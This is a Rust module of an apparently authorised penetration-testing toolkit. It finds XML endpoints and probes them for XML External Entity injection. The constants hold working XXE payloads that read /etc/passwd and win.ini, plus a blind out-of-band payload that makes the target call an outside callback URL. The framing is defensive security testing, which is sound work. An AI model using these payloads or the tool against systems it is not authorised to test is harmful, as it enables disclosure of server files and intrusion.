/*******************************************************************
 * Filename:        xxe.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-xxe — XML External Entity injection testing
 *                  Finds XML-accepting endpoints, injects XXE payloads,
 *                  detects file disclosure and OOB callbacks.
 * Notes:           OOB detection reads callbacks-*.json files written by
 *                  mg-oob; blind XXE only fires when --oob-url is set.
 *******************************************************************/

use std::fs;
use std::path::Path;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "xxe";
const AUDIT_TOOL: &str = "mg-xxe";

// XML content types that indicate an XML-accepting endpoint
const XML_CONTENT_TYPES: &[&str] = &["application/xml", "text/xml", "application/soap+xml"];

// Path segments that suggest XML processing
const XML_PATH_HINTS: &[&str] = &["xml", "soap", "wsdl"];

// File disclosure XXE payload — Linux /etc/passwd
const PAYLOAD_LINUX: &str = concat!(
    "<?xml version=\"1.0\"?>",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
    "<foo>&xxe;</foo>"
);

// File disclosure XXE payload — Windows win.ini
const PAYLOAD_WINDOWS: &str = concat!(
    "<?xml version=\"1.0\"?>",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>",
    "<foo>&xxe;</foo>"
);

// Template for OOB blind XXE; substitute {oob_url} and {token} before sending
const PAYLOAD_OOB_TEMPLATE: &str = concat!(
    "<?xml version=\"1.0\"?>",
    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{oob_url}/xxe-{token}\"> %xxe;]>",
    "<foo>test</foo>"
);

// Strings in the response body that confirm file disclosure
const DISCLOSURE_MARKERS_LINUX: &[&str] = &["root:"];
const DISCLOSURE_MARKERS_WINDOWS: &[&str] = &["[fonts]"];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
pub struct Args {
    /// Engagement name (must have crawl output)
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent probes
    #[arg(long, default_value_t = 5)]
    concurrency: usize,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 15)]
    timeout: u64,

    /// OOB callback URL (enables blind XXE payloads)
    #[arg(long)]
    oob_url: Option<String>,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Mirrors the EndpointMatch shape written by mg-crawl
#[derive(Deserialize, Clone)]
struct EndpointMatch {
    path: String,
    #[serde(default)]
    method: String,
    #[serde(default)]
    content_type: Option<String>,
}

// One XML-accepting target derived from the crawl corpus
#[derive(Debug, Clone)]
struct XmlTarget {
    url: String,
    method: String,
}

#[derive(Debug, Serialize, PartialEq, Eq)]
enum XxeVerdict {
    Confirmed,
    Potential,
    Miss,
}

// Result of one XXE probe
#[derive(Debug, Serialize)]
struct XxeResult {
    url: String,
    method: String,
    payload_label: String,
    verdict: XxeVerdict,
    body_snippet: String,
}

// Top-level output written to disk
#[derive(Serialize)]
struct XxeResults {
    engagement: String,
    timestamp: String,
    probes: usize,
    confirmed: usize,
    results: Vec<XxeResult>,
}

// ── Helpers ──────────────────────────────────────────────────────────────────

// Return current UTC timestamp as RFC 3339
fn now_rfc3339() -> String {
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "unknown".into())
}

// Sanitize timestamp for filename use (colons → underscores)
fn ts_for_filename(ts: &str) -> String {
    ts.chars()
        .map(|c| if c == ':' { '_' } else { c })
        .collect()
}

// Return true if the endpoint looks like it accepts XML
fn is_xml_endpoint(ep: &EndpointMatch) -> bool {
    if let Some(ct) = &ep.content_type {
        let ct_lower = ct.to_lowercase();
        if XML_CONTENT_TYPES.iter().any(|x| ct_lower.contains(x)) {
            return true;
        }
    }
    let path_lower = ep.path.to_lowercase();
    XML_PATH_HINTS.iter().any(|hint| path_lower.contains(hint))
}

// Collect XML-accepting targets from all crawl host directories
fn collect_xml_targets(crawl_dir: &Path) -> Vec<XmlTarget> {
    let mut targets = Vec::new();
    let Ok(hosts) = fs::read_dir(crawl_dir) else {
        return targets;
    };
    for entry in hosts.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let ep_path = entry.path().join("endpoints.json");
        let Ok(raw) = fs::read_to_string(&ep_path) else {
            continue;
        };
        let Ok(eps): Result<Vec<EndpointMatch>, _> = serde_json::from_str(&raw) else {
            continue;
        };
        for ep in eps {
            let method = if ep.method.is_empty() {
                "POST".to_string()
            } else {
                ep.method.clone()
            };
            // Only probe POST endpoints — GET endpoints don't process XML bodies
            if method != "POST" && !is_xml_endpoint(&ep) {
                continue;
            }
            if is_xml_endpoint(&ep) || method == "POST" {
                targets.push(XmlTarget {
                    url: ep.path.split('?').next().unwrap_or(&ep.path).to_string(),
                    method,
                });
            }
        }
    }
    targets
}

// Check OOB callback files for a token match
fn check_oob_callback(oob_dir: &Path, token: &str) -> bool {
    let Ok(entries) = fs::read_dir(oob_dir) else {
        return false;
    };
    for entry in entries.flatten() {
        let name = entry.file_name();
        let fname = name.to_string_lossy();
        if !fname.starts_with("callbacks-") || !fname.ends_with(".json") {
            continue;
        }
        let Ok(raw) = fs::read_to_string(entry.path()) else {
            continue;
        };
        if raw.contains(token) {
            return true;
        }
    }
    false
}

// Check response body for file disclosure markers
fn check_disclosure(body: &str, label: &str) -> XxeVerdict {
    let matched = match label {
        "linux_passwd" => DISCLOSURE_MARKERS_LINUX.iter().any(|m| body.contains(m)),
        "windows_winini" => DISCLOSURE_MARKERS_WINDOWS.iter().any(|m| body.contains(m)),
        _ => false,
    };
    if matched {
        XxeVerdict::Confirmed
    } else {
        XxeVerdict::Miss
    }
}

// Send one XXE probe; return (body, status)
async fn send_probe(
    client: &reqwest::Client,
    target: &XmlTarget,
    payload: &str,
) -> String {
    let result = client
        .request(
            reqwest::Method::from_bytes(target.method.as_bytes())
                .unwrap_or(reqwest::Method::POST),
            &target.url,
        )
        .header("Content-Type", "application/xml")
        .body(payload.to_string())
        .send()
        .await;
    match result {
        Ok(resp) => resp.text().await.unwrap_or_default(),
        Err(_) => String::new(),
    }
}

// Probe one target with all applicable payloads; return results vec
async fn probe_target(
    client: reqwest::Client,
    target: XmlTarget,
    oob_url: Option<String>,
    oob_dir: Option<std::path::PathBuf>,
) -> Vec<XxeResult> {
    let mut results = Vec::new();

    // Linux file disclosure
    let body = send_probe(&client, &target, PAYLOAD_LINUX).await;
    let snippet: String = body.chars().take(512).collect();
    let verdict = check_disclosure(&body, "linux_passwd");
    results.push(XxeResult {
        url: target.url.clone(),
        method: target.method.clone(),
        payload_label: "linux_passwd".to_string(),
        verdict,
        body_snippet: snippet,
    });

    // Windows file disclosure
    let body = send_probe(&client, &target, PAYLOAD_WINDOWS).await;
    let snippet: String = body.chars().take(512).collect();
    let verdict = check_disclosure(&body, "windows_winini");
    results.push(XxeResult {
        url: target.url.clone(),
        method: target.method.clone(),
        payload_label: "windows_winini".to_string(),
        verdict,
        body_snippet: snippet,
    });

    // OOB blind XXE if configured
    if let Some(ref oob) = oob_url {
        let token = format!("{:x}", std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0));
        let payload = PAYLOAD_OOB_TEMPLATE
            .replace("{oob_url}", oob)
            .replace("{token}", &token);
        let _ = send_probe(&client, &target, &payload).await;
        // Small delay to allow OOB callback to arrive
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
        let verdict = if oob_dir
            .as_deref()
            .map(|d| check_oob_callback(d, &token))
            .unwrap_or(false)
        {
            XxeVerdict::Confirmed
        } else {
            XxeVerdict::Potential
        };
        results.push(XxeResult {
            url: target.url.clone(),
            method: target.method.clone(),
            payload_label: format!("oob_blind_token_{token}"),
            verdict,
            body_snippet: String::new(),
        });
    }

    results
}

// ── Entry point ──────────────────────────────────────────────────────────────

pub async fn run(args: Args) -> Result<()> {
    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let targets = collect_xml_targets(&eng.crawl_dir());
    if targets.is_empty() {
        anyhow::bail!(
            "no XML-accepting endpoints found — run `mg-crawl {}` first",
            args.engagement
        );
    }

    eprintln!(
        "mg-xxe: {} XML targets, concurrency={}",
        targets.len(),
        args.concurrency
    );

    let auth_headers = session::get_auth_headers(&eng)
        .await
        .context("load session auth headers")?;

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(args.timeout))
        .default_headers(auth_headers)
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let oob_dir = args
        .oob_url
        .as_ref()
        .map(|_| eng.root.join("oob"));

    let mut join_set: JoinSet<Vec<XxeResult>> = JoinSet::new();
    let mut all_results: Vec<XxeResult> = Vec::new();

    for target in targets {
        // Drain when at concurrency ceiling
        if join_set.len() >= args.concurrency
            && let Some(Ok(mut rs)) = join_set.join_next().await
        {
            all_results.append(&mut rs);
        }
        let c = client.clone();
        let oob = args.oob_url.clone();
        let od = oob_dir.clone();
        join_set.spawn(probe_target(c, target, oob, od));
    }
    while let Some(Ok(mut rs)) = join_set.join_next().await {
        all_results.append(&mut rs);
    }

    // Print confirmed findings
    for r in &all_results {
        if r.verdict == XxeVerdict::Confirmed {
            eprintln!(
                "  [xxe-confirmed] {} method={} payload={}",
                r.url, r.method, r.payload_label
            );
        }
    }

    let confirmed = all_results
        .iter()
        .filter(|r| r.verdict == XxeVerdict::Confirmed)
        .count();

    let ts = now_rfc3339();
    let ts_file = ts_for_filename(&ts);

    let output = XxeResults {
        engagement: args.engagement.clone(),
        timestamp: ts.clone(),
        probes: all_results.len(),
        confirmed,
        results: all_results,
    };

    let output_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&output_dir).context("create xxe output dir")?;

    let results_path = output_dir.join(format!("results-{ts_file}.json"));
    fs::write(
        &results_path,
        serde_json::to_string_pretty(&output).unwrap_or_default(),
    )
    .context("write XXE results JSON")?;

    eprintln!(
        "mg-xxe: confirmed={} — {}",
        output.confirmed,
        results_path.display()
    );

    // Write finding for each confirmed XXE result
    for r in output.results.iter().filter(|r| r.verdict == XxeVerdict::Confirmed) {
        let tf = ToolFinding::new("mg-xxe", "XML External Entity Injection (XXE)", FindingSeverity::High)
            .url(r.url.clone())
            .evidence(format!("method={} payload={}", r.method, r.payload_label))
            .recommendation("Disable external entity processing in the XML parser; use a safe XML library configuration");
        let _ = write_finding(&eng, &tf);
    }

    let _ = eng.audit(
        AUDIT_TOOL,
        &eng.meta.target,
        Some(&format!(
            "probes={} confirmed={} ts={ts}",
            output.probes, output.confirmed
        )),
    );

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xml_endpoint_detected_by_content_type() {
        let ep = EndpointMatch {
            path: "/api/data".to_string(),
            method: "POST".to_string(),
            content_type: Some("application/xml".to_string()),
        };
        assert!(is_xml_endpoint(&ep));
    }

    #[test]
    fn xml_endpoint_detected_by_path_hint() {
        let ep = EndpointMatch {
            path: "/soap/service".to_string(),
            method: "POST".to_string(),
            content_type: None,
        };
        assert!(is_xml_endpoint(&ep));
    }

    #[test]
    fn non_xml_endpoint_not_detected() {
        let ep = EndpointMatch {
            path: "/api/users".to_string(),
            method: "GET".to_string(),
            content_type: Some("application/json".to_string()),
        };
        assert!(!is_xml_endpoint(&ep));
    }

    #[test]
    fn disclosure_linux_confirmed_on_root_marker() {
        let body = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1";
        assert_eq!(check_disclosure(body, "linux_passwd"), XxeVerdict::Confirmed);
    }

    #[test]
    fn disclosure_windows_confirmed_on_fonts_marker() {
        let body = "[fonts]\ncharset=00\n[extensions]\n";
        assert_eq!(check_disclosure(body, "windows_winini"), XxeVerdict::Confirmed);
    }

    #[test]
    fn disclosure_miss_on_clean_body() {
        let body = "<result>success</result>";
        assert_eq!(check_disclosure(body, "linux_passwd"), XxeVerdict::Miss);
    }

    #[test]
    fn ts_for_filename_replaces_colons() {
        assert_eq!(ts_for_filename("2026-05-17T12:00:00Z"), "2026-05-17T12_00_00Z");
    }

    #[test]
    fn oob_callback_not_found_when_dir_empty() {
        let dir = std::env::temp_dir().join("mg_xxe_test_empty");
        let _ = fs::create_dir_all(&dir);
        assert!(!check_oob_callback(&dir, "deadbeef"));
    }
}
